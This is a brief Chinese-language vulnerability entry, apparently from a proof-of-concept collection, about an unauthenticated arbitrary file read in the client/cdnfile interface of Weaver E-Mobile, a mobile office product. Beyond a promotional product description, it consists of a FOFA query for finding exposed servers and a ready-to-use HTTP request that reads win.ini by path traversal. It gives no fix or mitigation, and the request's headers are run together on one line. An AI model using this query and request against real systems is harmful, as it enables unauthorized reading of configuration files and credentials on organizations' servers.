## 泛微E-Mobile-client/cdnfile任意文件读取漏洞

## 一、漏洞简介
泛微E-Mobile是一款由泛微网络科技股份有限公司开发的移动办公产品，该产品专门为手机、平板电脑等移动终端用户设计，旨在提供便捷、高效的移动办公体验。适用于企业高管和有移动办公需求的业务部相关员工使用，特别适合于已有内部OA系统的大中型企业机构，尤其是企业或部门有较多的分支机构。近期推出的鸿蒙原生应用基线版本就实现了跨设备联动、应用接续等创新功能，为用户带来更加高效、便捷的移动办公体验。未来，泛微E-Mobile将继续引领数字化办公浪潮，为更多企业提供优质的移动办公解决方案。泛微E-Mobile client/cdnfile接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件），导致网站处于极度不安全状态

## fofa
```
app="泛微-EMobile"
```

## POC
```
GET /client/cdnfile/1C/Windows/win.ini?windows HTTP/1.1Host: your-ipUser-Agent: Mozilla/5.0 (Windows NT 10.0;Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: closeAccept-Charset: utf-8
```
